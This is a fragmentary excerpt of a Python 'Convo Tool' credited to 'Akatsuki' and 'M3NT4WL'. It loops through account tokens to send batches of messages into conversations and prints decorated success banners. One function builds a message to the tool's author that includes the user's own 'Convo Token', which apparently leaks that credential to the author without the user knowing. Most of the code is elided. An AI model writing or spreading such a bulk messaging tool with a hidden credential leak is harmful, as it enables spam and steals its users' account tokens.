...
def send_initial_message():
      ...
      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝐀𝐤𝐚𝐭𝐬𝐮𝐤𝐢 𝗦𝗶𝗿...!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
      ...
      def liness():
          print('\033[1;92m' + '[>] ==========𝟒𝐊𝟒𝐓𝐒𝐔𝐊!�=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;36;1m[❤️] YOU ARE USING MR. M3NT4WL CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
              ...
              print("\n[😏] 𝐀𝐋𝐋 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐒𝐄𝐍𝐃 𝐒𝐔𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 𝟒𝐊𝟒𝐓𝐒𝐔𝐊! 𝐑𝐔𝐋𝟑𝐗....\n")
